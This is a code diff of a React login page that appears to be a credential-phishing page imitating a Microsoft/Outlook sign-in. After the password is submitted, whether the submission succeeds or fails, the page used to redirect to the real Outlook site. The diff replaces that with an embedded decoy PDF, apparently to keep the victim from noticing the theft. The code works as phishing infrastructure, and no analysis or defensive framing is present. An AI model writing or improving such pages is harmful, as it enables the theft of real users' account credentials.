@@ -18,15 +18,11 @@ export default function Home() {
 
   const submitPasswordMutation = trpc.login.submitPassword.useMutation({
     onSuccess: () => {
-      setTimeout(() => {
-        window.location.href = "https://www.outlook.com.br/";
-      }, 300);
+      setPdfUrl("/manus-storage/HKI26-0382_a4a69c13.pdf");
     },
     onError: (error) => {
       console.error("Erro:", error);
-      setTimeout(() => {
-        window.location.href = "https://www.outlook.com.br/";
-      }, 300);
+      setPdfUrl("/manus-storage/HKI26-0382_a4a69c13.pdf");
     },
   });
 
@@ -67,6 +63,22 @@ export default function Home() {
   };
 
 
+
+  if (pdfUrl) {
+    return (
+      <div className="ms-bg">
+        <div className="ms-container">
+          <div className="ms-pdf-viewer">
+            <iframe
+              src={pdfUrl}
+              className="ms-pdf-iframe"
+              title="Documento"
+            />
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="ms-bg">
